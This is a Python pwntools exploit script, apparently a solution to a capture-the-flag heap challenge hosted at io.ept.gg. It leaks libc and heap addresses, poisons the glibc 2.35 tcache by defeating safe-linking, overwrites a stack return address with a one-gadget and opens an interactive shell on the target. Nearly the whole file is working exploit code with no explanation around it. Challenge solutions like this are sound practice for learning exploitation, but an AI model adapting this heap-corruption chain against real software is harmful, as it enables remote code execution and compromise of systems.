#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./heap')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+200
continue
'''.format(**locals())

# -- Exploit goes here --
def create(idx):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    if len(data) == 0x10:
        io.sendafter(b':', data)
    else:
        io.sendlineafter(b':', data)

def delete(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def view(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b': ', str(idx).encode())
    return io.recvline().strip()

def leak():
    io.sendlineafter(b'>', b'6')
    return int(io.recvline().strip())

def exit(idx):
    io.sendlineafter(b'>', b'5')

libc = ELF('./libc.2.35.so')

gadget = 330295
libc.address = 0
io = start()
libc.address = leak() - libc.sym.free
log.success(f'libc base @ {hex(libc.address)}')

create(0)
create(1)
delete(0)
delete(1)

leakz = u64(view(0).ljust(8, b'\x00')) << 12
log.success(f'heap leak @ {hex(leakz)}')
log.success(f'libc free hook @ {hex(libc.address + 0x21aa20)}')
edit(1, p64((libc.address + 0x21aa20) ^ leakz >> 12))
create(0)
create(1)
# edit(1, p64(libc.sym.system))
leakz2 = u64(view(1).ljust(8, b'\x00')) 

stack_libc_ret = leakz2-112-160
print(f'libc_ret @ stack: {hex(stack_libc_ret)}')


create(0)
create(1)
delete(0)
delete(1)
edit(1, p64(stack_libc_ret-8 ^ leakz >> 12))
create(0)
create(1)
edit(1, p64(0)+p64(libc.address + gadget))
io.sendline(b'0')
io.interactive()
